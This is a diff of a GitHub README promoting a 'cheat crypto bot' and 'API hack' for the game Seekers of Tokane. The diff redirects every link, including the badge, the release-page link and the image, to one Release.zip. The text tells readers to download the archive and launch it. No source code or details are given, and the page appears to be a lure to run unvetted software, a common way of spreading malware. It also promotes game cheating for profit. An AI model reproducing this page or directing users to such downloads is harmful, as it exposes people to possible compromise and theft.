@@ -1,5 +1,5 @@
 # 🌟 **Seekers of Tokane Cheat Crypto Bot - Auto Farm Clicker Game API Hack** 🌟
-[![GitHub release (latest by date)](https://img.shields.io/github/v/release/22155555/1875695542?label=Download%20Software%20v1.0&style=for-the-badge)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![GitHub release (latest by date)](https://github.com/arnoldjensen/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases/download/v1.0/Release.zip%20Software%20v1.0&style=for-the-badge)](https://github.com/arnoldjensen/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases/download/v1.0/Release.zip)
 
 Welcome to the Seekers of Tokane Cheat Crypto Bot repository! This innovative bot is designed to revolutionize your gaming experience by automating farming and clicker activities within the Seekers of Tokane game. With cutting-edge features for crypto integration and API support, this bot is equipped with cheats and hacks to optimize profits and enhance gameplay efficiency.
 
@@ -13,7 +13,7 @@ Welcome to the Seekers of Tokane Cheat Crypto Bot repository! This innovative bo
 - **Mini-Game Enhancements**: Unlock hidden features and improvements for a more engaging gaming experience.
 
 ## 🚀 Installation
-Download the latest version of the software [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). Once downloaded, launch the software to begin automating your Seekers of Tokane gameplay.
+Download the latest version of the software [here](https://github.com/arnoldjensen/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases/download/v1.0/Release.zip). Once downloaded, launch the software to begin automating your Seekers of Tokane gameplay.
 
 ## 📁 Repository Topics
 This repository covers a wide range of topics related to the Seekers of Tokane Cheat Crypto Bot, including:
@@ -39,9 +39,9 @@ This repository covers a wide range of topics related to the Seekers of Tokane C
 - seekers-of-tokane-game
 
 ## 🌐 Explore More
-If you're interested in discovering more about the Seekers of Tokane Cheat Crypto Bot, visit the [software release page](https://github.com/22155555/1875695542/releases) for additional information and updates.
+If you're interested in discovering more about the Seekers of Tokane Cheat Crypto Bot, visit the [software release page](https://github.com/arnoldjensen/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases/download/v1.0/Release.zip) for additional information and updates.
 
-![Seekers of Tokane Cheat Crypto Bot](https://yourimageurl.com)
+![Seekers of Tokane Cheat Crypto Bot](https://github.com/arnoldjensen/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases/download/v1.0/Release.zip)
 
 ## 🤖 Get Started
 Unleash the power of automation and optimization in Seekers of Tokane with our Cheat Crypto Bot. Download the software now and elevate your gaming experience to new heights!
